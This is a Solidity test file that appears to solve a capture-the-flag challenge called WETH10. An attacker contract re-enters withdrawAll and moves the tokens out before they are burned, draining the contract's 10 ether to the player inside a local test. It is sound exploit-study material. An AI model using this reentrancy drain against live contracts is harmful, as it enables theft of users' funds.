// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/WETH10/WETH10.sol";
import "../src/WETH10/Bob.sol";

contract WETHAttack is Test {
    WETH10 public weth;
    Bob public bobContract;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(
            address(weth).balance,
            10 ether,
            "weth contract should have 10 ether"
        );

        //---------------------------------------------------------
        vm.startPrank(bob);
        //bob approve himself ==> 11 ether
        weth.approve(address(bob), 11 ether);
        vm.label(address(bobContract), "AttackerContract");

        //deploy the attacker contract
        bobContract = new Bob(payable(address(weth)));

        // bob deposit  1 ether gets a Token ;
        //Aproved himself
        // transfer that Token to his bobcontract so now his bob contract has 1 token
        /* bob call callWithdrawAll then ..we can withdraw 1 ether,  to our Attacker Contract ... before going to _burnAll() (WETH10 Line 29) we gonna 
        send those tokens to bob's EOA  ..repeat it 10 times, we withdraw all the ether in bobContract then  finally we withdraw the rest (1 remaining ether) by directly calling 
        withdrawAll function in WETH10  
        */
        for (uint256 i = 0; i < 10; i++) {
            weth.deposit{value: 1 ether}();
            weth.transferFrom(bob, address(bobContract), 1 ether); //  transfering 1 Token
            bobContract.callBackwithdrawAll();
            bobContract.getEtherBack();
        }
        weth.withdrawAll();
        vm.stopPrank();
        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}
